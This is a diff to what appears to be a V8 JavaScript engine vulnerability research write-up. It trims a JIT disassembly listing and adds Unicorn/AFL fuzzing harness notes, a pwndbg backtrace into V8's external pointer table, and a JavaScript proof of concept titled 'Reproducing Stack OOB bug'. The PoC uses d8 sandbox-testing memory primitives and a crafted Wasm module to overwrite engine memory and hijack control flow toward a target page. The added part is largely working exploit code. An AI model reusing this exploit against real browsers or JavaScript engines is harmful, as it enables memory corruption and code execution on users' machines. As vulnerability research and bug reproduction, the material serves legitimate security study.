@@ -1399,228 +1399,7 @@ Instructions (size = 1408)
 0x7fff6000080f   1cf  450fb70440           movzxwl r8,[r8+rax*2] // get value here R8D, [0x25b604000010] => 0 |  RAX  0x2000000
 0x7fff60000814   1d4  41baffffffff         movl r10,0xffffffff
 0x7fff6000081a   1da  4d3bc2               REX.W cmpq r8,r10
-0x7fff6000081d   1dd  760d                 jna 0x7fff6000082c  <+0x1ec>
-0x7fff6000081f   1df  ba02000000           movl rdx,0x2
-0x7fff60000824   1e4  41ff9580550000       call [r13+0x5580]
-0x7fff6000082b   1eb  cc                   int3l
-0x7fff6000082c   1ec  488b5d20             REX.W movq rbx,[rbp+0x20]
-0x7fff60000830   1f0  f6c301               testb rbx,0x1
-0x7fff60000833   1f3  0f856b030000         jnz 0x7fff60000ba4  <+0x564>
-0x7fff60000839   1f9  488bf3               REX.W movq rsi,rbx
-0x7fff6000083c   1fc  d1fe                 sarl rsi, 1
-0x7fff6000083e   1fe  81c637130000         addl rsi,0x1337
-0x7fff60000844   204  0f805e030000         jo 0x7fff60000ba8  <+0x568>
-0x7fff6000084a   20a  488945e0             REX.W movq [rbp-0x20],rax
-0x7fff6000084e   20e  4c8945b0             REX.W movq [rbp-0x50],r8
-0x7fff60000852   212  488975a8             REX.W movq [rbp-0x58],rsi
-0x7fff60000856   216  4585c9               testl r9,r9
-0x7fff60000859   219  0f854d000000         jnz 0x7fff600008ac  <+0x26c>
-0x7fff6000085f   21f  f6c102               testb rcx,0x2
-0x7fff60000862   222  0f850d000000         jnz 0x7fff60000875  <+0x235>
-0x7fff60000868   228  4c8b4a27             REX.W movq r9,[rdx+0x27]
-0x7fff6000086c   22c  49c1e91d             REX.W shrq r9, 29
-0x7fff60000870   230  e9d4000000           jmp 0x7fff60000949  <+0x309>
-0x7fff60000875   235  4c8b4a1f             REX.W movq r9,[rdx+0x1f]
-0x7fff60000879   239  49c1e91d             REX.W shrq r9, 29
-0x7fff6000087d   23d  4c8b4713             REX.W movq r8,[rdi+0x13]
-0x7fff60000881   241  49c1e81d             REX.W shrq r8, 29
-0x7fff60000885   245  488b7a17             REX.W movq rdi,[rdx+0x17]
-0x7fff60000889   249  48c1ef1d             REX.W shrq rdi, 29
-0x7fff6000088d   24d  4903f9               REX.W addq rdi,r9
-0x7fff60000890   250  493bf8               REX.W cmpq rdi,r8
-0x7fff60000893   253  0f8603000000         jna 0x7fff6000089c  <+0x25c>
-0x7fff60000899   259  4533c9               xorl r9,r9
-0x7fff6000089c   25c  49d1e9               REX.W shrq r9, 1
-0x7fff6000089f   25f  4c8b45b0             REX.W movq r8,[rbp-0x50]
-0x7fff600008a3   263  488b7dc0             REX.W movq rdi,[rbp-0x40]
-0x7fff600008a7   267  e99d000000           jmp 0x7fff60000949  <+0x309>
-0x7fff600008ac   26c  f6c102               testb rcx,0x2
-0x7fff600008af   26f  0f8571000000         jnz 0x7fff60000926  <+0x2e6>
-0x7fff600008b5   275  57                   push rdi
-0x7fff600008b6   276  48be95aa2900eb370000 REX.W movq rsi,0x37eb0029aa95    ;; object: 0x37eb0029aa95 <ScriptContext[6]>
-0x7fff600008c0   280  488b1d6bfeffff       REX.W movq rbx,[rip+0xfffffe6b]
-0x7fff600008c7   287  b801000000           movl rax,0x1
-0x7fff600008cc   28c  4c8bcb               REX.W movq r9,rbx
-0x7fff600008cf   28f  e8ac40851f           call 0x7fff7f854980  (CEntry_Return1_ArgvOnStack_NoBuiltinExit)    ;; near builtin entry
-0x7fff600008d4   294  a801                 test al,0x1
-0x7fff600008d6   296  0f85a0020000         jnz 0x7fff60000b7c  <+0x53c>
-0x7fff600008dc   29c  d1f8                 sarl rax, 1
-0x7fff600008de   29e  c5832ac0             vcvtlsi2sd xmm0,xmm15,rax
-0x7fff600008e2   2a2  48ba859c0400eb370000 REX.W movq rdx,0x37eb00049c85    ;; object: 0x37eb00049c85 <Uint16Array map = 0x37eb0028d9dd>
-0x7fff600008ec   2ac  488b4a17             REX.W movq rcx,[rdx+0x17]
-0x7fff600008f0   2b0  48c1e91d             REX.W shrq rcx, 29
-0x7fff600008f4   2b4  c4e1fb2cf8           vcvttsd2siq rdi,xmm0
-0x7fff600008f9   2b9  482bf9               REX.W subq rdi,rcx
-0x7fff600008fc   2bc  48d1ef               REX.W shrq rdi, 1
-0x7fff600008ff   2bf  4c8bcf               REX.W movq r9,rdi
-0x7fff60000902   2c2  488b45e0             REX.W movq rax,[rbp-0x20]
-0x7fff60000906   2c6  4c8b65d8             REX.W movq r12,[rbp-0x28]
-0x7fff6000090a   2ca  448b5dd0             movl r11,[rbp-0x30]
-0x7fff6000090e   2ce  488b5d20             REX.W movq rbx,[rbp+0x20]
-0x7fff60000912   2d2  488b7dc0             REX.W movq rdi,[rbp-0x40]
-0x7fff60000916   2d6  8b4db8               movl rcx,[rbp-0x48]
-0x7fff60000919   2d9  4c8b45b0             REX.W movq r8,[rbp-0x50]
-0x7fff6000091d   2dd  488b75a8             REX.W movq rsi,[rbp-0x58]
-0x7fff60000921   2e1  e91f000000           jmp 0x7fff60000945  <+0x305>
-0x7fff60000926   2e6  4c8b4f13             REX.W movq r9,[rdi+0x13]
-0x7fff6000092a   2ea  49c1e91d             REX.W shrq r9, 29
-0x7fff6000092e   2ee  4c8b7a17             REX.W movq r15,[rdx+0x17]
-0x7fff60000932   2f2  49c1ef1d             REX.W shrq r15, 29
-0x7fff60000936   2f6  4d3bf9               REX.W cmpq r15,r9
-0x7fff60000939   2f9  0f8747020000         ja 0x7fff60000b86  <+0x546>
-0x7fff6000093f   2ff  4d2bcf               REX.W subq r9,r15
-0x7fff60000942   302  49d1e9               REX.W shrq r9, 1
-0x7fff60000945   305  4c8b7d18             REX.W movq r15,[rbp+0x18]
-0x7fff60000949   309  493bc1               REX.W cmpq rax,r9
-0x7fff6000094c   30c  0f835a020000         jnc 0x7fff60000bac  <+0x56c>
-0x7fff60000952   312  4c8bce               REX.W movq r9,rsi
-0x7fff60000955   315  4503c1               addl r8,r9
-0x7fff60000958   318  41baffffffff         movl r10,0xffffffff
-0x7fff6000095e   31e  4d3bc2               REX.W cmpq r8,r10
-0x7fff60000961   321  760d                 jna 0x7fff60000970  <+0x330>
-0x7fff60000963   323  ba02000000           movl rdx,0x2
-0x7fff60000968   328  41ff9580550000       call [r13+0x5580]
-0x7fff6000096f   32f  cc                   int3l
-0x7fff60000970   330  458bcb               movl r9,r11
-0x7fff60000973   333  41baffffffff         movl r10,0xffffffff
-0x7fff60000979   339  4d3bca               REX.W cmpq r9,r10
-0x7fff6000097c   33c  760d                 jna 0x7fff6000098b  <+0x34b>
-0x7fff6000097e   33e  ba02000000           movl rdx,0x2
-0x7fff60000983   343  41ff9580550000       call [r13+0x5580]
-0x7fff6000098a   34a  cc                   int3l
-0x7fff6000098b   34b  4d01e1               REX.W addq r9,r12
-0x7fff6000098e   34e  6645890441           movw [r9+rax*2],r8
-0x7fff60000993   353  f6c101               testb rcx,0x1
-0x7fff60000996   356  0f8550000000         jnz 0x7fff600009ec  <+0x3ac>
-0x7fff6000099c   35c  f6c102               testb rcx,0x2
-0x7fff6000099f   35f  0f850d000000         jnz 0x7fff600009b2  <+0x372>
-0x7fff600009a5   365  488b4a27             REX.W movq rcx,[rdx+0x27]
-0x7fff600009a9   369  48c1e91d             REX.W shrq rcx, 29
-0x7fff600009ad   36d  e9c8000000           jmp 0x7fff60000a7a  <+0x43a>
-0x7fff600009b2   372  488b4a1f             REX.W movq rcx,[rdx+0x1f]
-0x7fff600009b6   376  48c1e91d             REX.W shrq rcx, 29
-0x7fff600009ba   37a  488b7f13             REX.W movq rdi,[rdi+0x13]
-0x7fff600009be   37e  48c1ef1d             REX.W shrq rdi, 29
-0x7fff600009c2   382  4c8b4217             REX.W movq r8,[rdx+0x17]
-0x7fff600009c6   386  49c1e81d             REX.W shrq r8, 29
-0x7fff600009ca   38a  4c03c1               REX.W addq r8,rcx
-0x7fff600009cd   38d  4c3bc7               REX.W cmpq r8,rdi
-0x7fff600009d0   390  0f8608000000         jna 0x7fff600009de  <+0x39e>
-0x7fff600009d6   396  4533c9               xorl r9,r9
-0x7fff600009d9   399  e903000000           jmp 0x7fff600009e1  <+0x3a1>
-0x7fff600009de   39e  4c8bc9               REX.W movq r9,rcx
-0x7fff600009e1   3a1  49d1e9               REX.W shrq r9, 1
-0x7fff600009e4   3a4  498bc9               REX.W movq rcx,r9
-0x7fff600009e7   3a7  e98e000000           jmp 0x7fff60000a7a  <+0x43a>
-0x7fff600009ec   3ac  f6c102               testb rcx,0x2
-0x7fff600009ef   3af  0f8566000000         jnz 0x7fff60000a5b  <+0x41b>
-0x7fff600009f5   3b5  57                   push rdi
-0x7fff600009f6   3b6  488b0d35fdffff       REX.W movq rcx,[rip+0xfffffd35]
-0x7fff600009fd   3bd  48be95aa2900eb370000 REX.W movq rsi,0x37eb0029aa95    ;; object: 0x37eb0029aa95 <ScriptContext[6]>
-0x7fff60000a07   3c7  b801000000           movl rax,0x1
-0x7fff60000a0c   3cc  488bd9               REX.W movq rbx,rcx
-0x7fff60000a0f   3cf  e86c3f851f           call 0x7fff7f854980  (CEntry_Return1_ArgvOnStack_NoBuiltinExit)    ;; near builtin entry
-0x7fff60000a14   3d4  a801                 test al,0x1
-0x7fff60000a16   3d6  0f8572010000         jnz 0x7fff60000b8e  <+0x54e>
-0x7fff60000a1c   3dc  d1f8                 sarl rax, 1
-0x7fff60000a1e   3de  c5832ac0             vcvtlsi2sd xmm0,xmm15,rax
-0x7fff60000a22   3e2  48ba859c0400eb370000 REX.W movq rdx,0x37eb00049c85    ;; object: 0x37eb00049c85 <Uint16Array map = 0x37eb0028d9dd>
-0x7fff60000a2c   3ec  488b4a17             REX.W movq rcx,[rdx+0x17]
-0x7fff60000a30   3f0  48c1e91d             REX.W shrq rcx, 29
-0x7fff60000a34   3f4  c4e1fb2cf8           vcvttsd2siq rdi,xmm0
-0x7fff60000a39   3f9  482bf9               REX.W subq rdi,rcx
-0x7fff60000a3c   3fc  48d1ef               REX.W shrq rdi, 1
-0x7fff60000a3f   3ff  488bcf               REX.W movq rcx,rdi
-0x7fff60000a42   402  488b45e0             REX.W movq rax,[rbp-0x20]
-0x7fff60000a46   406  4c8b65d8             REX.W movq r12,[rbp-0x28]
-0x7fff60000a4a   40a  448b5dd0             movl r11,[rbp-0x30]
-0x7fff60000a4e   40e  4c8b7d18             REX.W movq r15,[rbp+0x18]
-0x7fff60000a52   412  488b5d20             REX.W movq rbx,[rbp+0x20]
-0x7fff60000a56   416  e91f000000           jmp 0x7fff60000a7a  <+0x43a>
-0x7fff60000a5b   41b  488b4f13             REX.W movq rcx,[rdi+0x13]
-0x7fff60000a5f   41f  48c1e91d             REX.W shrq rcx, 29
-0x7fff60000a63   423  488b7a17             REX.W movq rdi,[rdx+0x17]
-0x7fff60000a67   427  48c1ef1d             REX.W shrq rdi, 29
-0x7fff60000a6b   42b  483bf9               REX.W cmpq rdi,rcx
-0x7fff60000a6e   42e  0f8724010000         ja 0x7fff60000b98  <+0x558>
-0x7fff60000a74   434  482bcf               REX.W subq rcx,rdi
-0x7fff60000a77   437  48d1e9               REX.W shrq rcx, 1
-0x7fff60000a7a   43a  483bc1               REX.W cmpq rax,rcx
-0x7fff60000a7d   43d  0f832d010000         jnc 0x7fff60000bb0  <+0x570>
-0x7fff60000a83   443  418bcb               movl rcx,r11
-0x7fff60000a86   446  41baffffffff         movl r10,0xffffffff
-0x7fff60000a8c   44c  493bca               REX.W cmpq rcx,r10
-0x7fff60000a8f   44f  760d                 jna 0x7fff60000a9e  <+0x45e>
-0x7fff60000a91   451  ba02000000           movl rdx,0x2
-0x7fff60000a96   456  41ff9580550000       call [r13+0x5580]
-0x7fff60000a9d   45d  cc                   int3l
-0x7fff60000a9e   45e  4c89e7               REX.W movq rdi,r12
-0x7fff60000aa1   461  4803cf               REX.W addq rcx,rdi
-0x7fff60000aa4   464  0fb70c41             movzxwl rcx,[rcx+rax*2]
-0x7fff60000aa8   468  41baffffffff         movl r10,0xffffffff
-0x7fff60000aae   46e  493bca               REX.W cmpq rcx,r10
-0x7fff60000ab1   471  760d                 jna 0x7fff60000ac0  <+0x480>
-0x7fff60000ab3   473  ba02000000           movl rdx,0x2
-0x7fff60000ab8   478  41ff9580550000       call [r13+0x5580]
-0x7fff60000abf   47f  cc                   int3l
-0x7fff60000ac0   480  8d0409               leal rax,[rcx+rcx*1]
-0x7fff60000ac3   483  41baffffffff         movl r10,0xffffffff
-0x7fff60000ac9   489  493bc2               REX.W cmpq rax,r10
-0x7fff60000acc   48c  760d                 jna 0x7fff60000adb  <+0x49b>
-0x7fff60000ace   48e  ba02000000           movl rdx,0x2
-0x7fff60000ad3   493  41ff9580550000       call [r13+0x5580]
-0x7fff60000ada   49a  cc                   int3l
-0x7fff60000adb   49b  488b4de8             REX.W movq rcx,[rbp-0x18]
-0x7fff60000adf   49f  488be5               REX.W movq rsp,rbp
-0x7fff60000ae2   4a2  5d                   pop rbp
-0x7fff60000ae3   4a3  4883f903             REX.W cmpq rcx,0x3
-0x7fff60000ae7   4a7  7f03                 jg 0x7fff60000aec  <+0x4ac>
-0x7fff60000ae9   4a9  c21800               ret 0x18
-0x7fff60000aec   4ac  415a                 pop r10
-0x7fff60000aee   4ae  488d24cc             REX.W leaq rsp,[rsp+rcx*8]
-0x7fff60000af2   4b2  4152                 push r10
-0x7fff60000af4   4b4  c3                   retl
-0x7fff60000af5   4b5  ba00010000           movl rdx,0x100
-0x7fff60000afa   4ba  52                   push rdx
-0x7fff60000afb   4bb  b801000000           movl rax,0x1
-0x7fff60000b00   4c0  48bbc08933f5ff7f0000 REX.W movq rbx,0x7ffff53389c0    ;; external reference (Runtime::StackGuardWithGap)
-0x7fff60000b0a   4ca  48be85182800eb370000 REX.W movq rsi,0x37eb00281885    ;; object: 0x37eb00281885 <NativeContext[297]>
-0x7fff60000b14   4d4  e8673e851f           call 0x7fff7f854980  (CEntry_Return1_ArgvOnStack_NoBuiltinExit)    ;; near builtin entry
-0x7fff60000b19   4d9  e968fbffff           jmp 0x7fff60000686  <+0x46>
-0x7fff60000b1e   4de  c5fb104003           vmovsd xmm0,[rax+0x3]
-0x7fff60000b23   4e3  e92afcffff           jmp 0x7fff60000752  <+0x112>
-0x7fff60000b28   4e8  4533c0               xorl r8,r8
-0x7fff60000b2b   4eb  e96dfcffff           jmp 0x7fff6000079d  <+0x15d>
-
-0x7fff60000b30   4f0  418b47ff             movl rax,[r15-0x1]
-0x7fff60000b34   4f4  41baffffffff         movl r10,0xffffffff
-0x7fff60000b3a   4fa  493bc2               REX.W cmpq rax,r10
-0x7fff60000b3d   4fd  760d                 jna 0x7fff60000b4c  <+0x50c>
-0x7fff60000b3f   4ff  ba02000000           movl rdx,0x2
-0x7fff60000b44   504  41ff9580550000       call [r13+0x5580]
-0x7fff60000b4b   50b  cc                   int3l
-0x7fff60000b4c   50c  3d09080000           cmp rax,0x809
-0x7fff60000b51   511  0f855d000000         jnz 0x7fff60000bb4  <+0x574>
-0x7fff60000b57   517  c4c17b104703         vmovsd xmm0,[r15+0x3]
-0x7fff60000b5d   51d  c4e1fb2cc0           vcvttsd2siq rax,xmm0
-0x7fff60000b62   522  c4e1832ac8           vcvtqsi2sd xmm1,xmm15,rax
-0x7fff60000b67   527  c5f92ec1             vucomisd xmm0,xmm1
-0x7fff60000b6b   52b  0f8a47000000         jpe 0x7fff60000bb8  <+0x578>
-0x7fff60000b71   531  0f8541000000         jnz 0x7fff60000bb8  <+0x578>
-0x7fff60000b77   537  e96cfcffff           jmp 0x7fff600007e8  <+0x1a8>
-0x7fff60000b7c   53c  c5fb104003           vmovsd xmm0,[rax+0x3]
-0x7fff60000b81   541  e95cfdffff           jmp 0x7fff600008e2  <+0x2a2>
-0x7fff60000b86   546  4533c9               xorl r9,r9
-0x7fff60000b89   549  e9b7fdffff           jmp 0x7fff60000945  <+0x305>
-0x7fff60000b8e   54e  c5fb104003           vmovsd xmm0,[rax+0x3]
-0x7fff60000b93   553  e98afeffff           jmp 0x7fff60000a22  <+0x3e2>
-0x7fff60000b98   558  33c9                 xorl rcx,rcx
-0x7fff60000b9a   55a  e9dbfeffff           jmp 0x7fff60000a7a  <+0x43a>
-0x7fff60000b9f   55f  90                   nop
-0x7fff60000ba0   560  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '32c'
-                                                             ;; debug: deopt position, inlining id '0'
-                                                             ;; debug: deopt reason 'out of bounds'
-
+//...
 
 ```
 
@@ -1731,3 +1510,120 @@ Run fuzzer:
 CONTEXT_DIR=UnicornContext_20240726_142026 AFL_DEBUG=1 afl-fuzz -U -m none -i sample_inputs/ -o fuzz_out1 -- ./harness @@
 ```
 
+**Finnally**
+
+`./harness_manfred -t test_cases/manfred_sub_under_overflow.bin`
+
+
+```cpp
+                case 0xba900049c7c: // smt's related external pointer table 
+                    /*
+                    pwndbg> vmmap 0x7fff40020018
+                    LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+                                Start                End Perm     Size Offset File
+                        0x7fff40000000     0x7fff40010000 r--p    10000      0 [anon_7fff40000]
+                    ►   0x7fff40010000     0x7fff40030000 rw-p    20000      0 [anon_7fff40010] +0x10018
+                        0x7fff40030000     0x7fff60000000 ---p 1ffd0000      0 [anon_7fff40030]
+
+                    */
+                    value = 0x001000c0;
+                    uc_mem_write(uc, address, &value, size);
+                    DEBUG_COLOR(COLOR_RED, "##### 0x%"PRIx64" -> 0x%x hooking", 
+                                address, 0x001000c0);
+                    break;
+// ========================
+pwndbg> bt
+#0  0x00005555556342a0 in v8::internal::TaggedPayload<v8::internal::ExternalPointerTableEntry::ExternalPointerTaggingScheme> std::__Cr::__cxx_atomic_load<v8::internal::TaggedPayload<v8::internal::ExternalPointerTableEntry::ExternalPointerTaggingScheme> >(std::__Cr::__cxx_atomic_base_impl<v8::internal::TaggedPayload<v8::internal::ExternalPointerTableEntry::ExternalPointerTaggingScheme> > const*, std::__Cr::memory_order) () at ../../third_party/libc++/src/include/__atomic/cxx_atomic_impl.h:317
+#1  0x000055555563422b in std::__Cr::__atomic_base<v8::internal::TaggedPayload<v8::internal::ExternalPointerTableEntry::ExternalPointerTaggingScheme>, false>::load(std::__Cr::memory_order) const () at ../../third_party/libc++/src/include/__atomic/atomic_base.h:59
+#2  0x00005555556341f6 in v8::internal::ExternalPointerTableEntry::GetExternalPointer(v8::internal::ExternalPointerTag) const () at ../../src/sandbox/external-pointer-table-inl.h:31
+#3  0x0000555555633f95 in v8::internal::ExternalPointerTable::Get(unsigned int, v8::internal::ExternalPointerTag) const () at ../../src/sandbox/external-pointer-table-inl.h:173
+#4  0x00007ffff43700ec in v8::internal::JSArrayBuffer::extension() const () at ../../src/objects/js-array-buffer-inl.h:110
+#5  0x00007ffff434dd99 in v8::internal::JSArrayBuffer::GetBackingStore() const () at ../../src/objects/js-array-buffer-inl.h:59
+#6  0x00007ffff53ca778 in v8::internal::__RT_impl_Runtime_GrowableSharedArrayBufferByteLength(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) () at ../../src/runtime/runtime-typedarray.cc:73
+#7  0x00007ffff53ca3fc in v8::internal::Runtime_GrowableSharedArrayBufferByteLength(int, unsigned long*, v8::internal::Isolate*) () at ../../src/runtime/runtime-typedarray.cc:67
+```
+
+### Reproducing Stack OOB bug
+
+
+```js
+// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/test9.js
+
+d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+
+console.log("[*] Leak sandbox base address");
+// ================= reading heap_base =============================
+let heap_addr = BigInt(Sandbox.base);
+console.log("heap_addr: 0x" + heap_addr.toString(16));
+let target_page = BigInt(Sandbox.targetPage);
+console.log("target_page: 0x" + target_page.toString(16));
+// ================================================================
+
+const builder = new WasmModuleBuilder();
+builder.exportMemoryAs("mem0", 0);
+const GB = 1024 * 1024 * 1024;
+let $mem0 = builder.addMemory64(1 * GB / kPageSize);
+
+let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
+
+let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
+// let $Sig_i_iii = builder.addType(kSig_i_iii);
+
+builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
+//let kSig_v_i = makeSig([kWasmI32], []);
+  kExprLocalGet, 0,
+  ...wasmI32Const(0x41414141),
+  kExprI32StoreMem, 0, 0, // i32.store offset = -1
+]);
+builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
+  kExprLocalGet, 0,
+//   kExprI32ConvertI64,
+  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
+  kExprI64Mul,
+]);
+
+
+let instance = builder.instantiate();
+
+instance.exports.func0(0n);
+
+instance.exports.func1(0n);
+instance.exports.func0(0n);
+
+// ===============================
+// 0x13n + 0xcn
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x1fn);
+console.log((heap_addr + 0x200000n).toString(16));
+// let dummy = 1n;
+
+// 0x2001a9 - 0x38
+let offset_base = 0x200161n; // magic number...
+console.log("offset_base: 0x" + offset_base.toString(16));
+
+v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
+v8_write64(0x250000n + 0xec48n, target_page); // pop rax -> jump rax 
+
+v8_write64(offset_base - 0x28n, target_page);
+v8_write64(0x200000n + 0x58n, target_page);
+v8_write64(0x200400n + 0x10n, 0x4242424242n);
+
+v8_write64(offset_base, heap_addr + 0x200000n); // 0000555555D9F2F8                 test    rax, rax // in AddSample
+v8_write64(offset_base - 0x20n, heap_addr + 0x200200n); // 000555555A65589                 test    rax, rax // outside AddSample, before StopInternal
+
+
+// trigger
+instance.exports.func1(0x4141n);
+```
